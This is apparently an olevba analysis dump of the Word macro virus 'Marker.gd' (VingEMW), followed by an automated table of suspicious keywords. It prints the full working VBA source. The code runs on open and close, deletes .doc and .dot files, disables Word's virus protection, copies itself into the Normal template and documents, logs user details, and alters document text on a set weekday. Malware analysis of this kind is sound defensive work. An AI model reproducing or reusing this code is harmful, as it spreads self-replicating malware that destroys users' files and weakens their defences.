olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gd-666546c1ea20aca1f03e73906532f79bd7a93cd2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gd-666546c1ea20aca1f03e73906532f79bd7a93cd2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Marker = "<- VingEMW"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim RMF, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
ShowVisualBasicEditor = False
Application.UserName = "VingEMW"
Application.UserInitials = "VE"
Application.UserAddress = "dodolrmf@mailcity.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 4 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   RMF = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   RMF = RMF & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString RMF
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    RMF = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString RMF
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
On Error Resume Next
k1 = "Please ... titip salam buat Unik (EmW),"
k2 = "Fakultas Hukum UNSRI '97"
MsgBox k1 & Chr(13) & k2, 0, "VingEMW"
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "dan"
        .Replacement.Text = "Unik (EMW), I Miss U !!!"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
Return
Finish:
End Sub
' 07:58:457:58:45 AM AM-Thursday, 15 Jun 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 06:24:416:24:41 PM PM-Saturday, 24 Jun 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 07:13:467:13:46 PM PM-Tuesday, 11 Jul 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 08:17:448:17:44 -Sabtu, 15 Jul 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 07:58:47:58:04 PM PM-Monday, 31 Jul 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 12:41:5812:41:58 PM PM-Sunday, 18 Apr 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 02:01:82:01:08 PM PM-Saturday, 22 May 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 02:38:4014:38:40 -Rabu, 26 Mei 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 07:49:2719:49:27 -Rabu, 6 Sep 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 03:49:293:49:29 PM PM-Friday, 8 Sep 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 05:41:25:41:02 PM PM-Monday, 6 Sep 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 06:08:516:08:51 PM PM-Monday, 1 Jan 1990
' VingEMW
' dodolrmf@mailcity.com

 


' 05:13:585:13:58 PM PM-Wednesday, 7 Feb 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 04:23:574:23:57 -Selasa, 13 Feb 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 09:37:139:37:13 -Rabu, 14 Feb 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 06:29:5218:29:52 Grunge Grunge-Monday, 2 Apr 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 04:25:2316:25:23  odp.-pátek, 5 I 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 11:28:4411:28:44 -Freitag, 12 Okt 2001
' VingEMW
' dodolrmf@mailcity.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
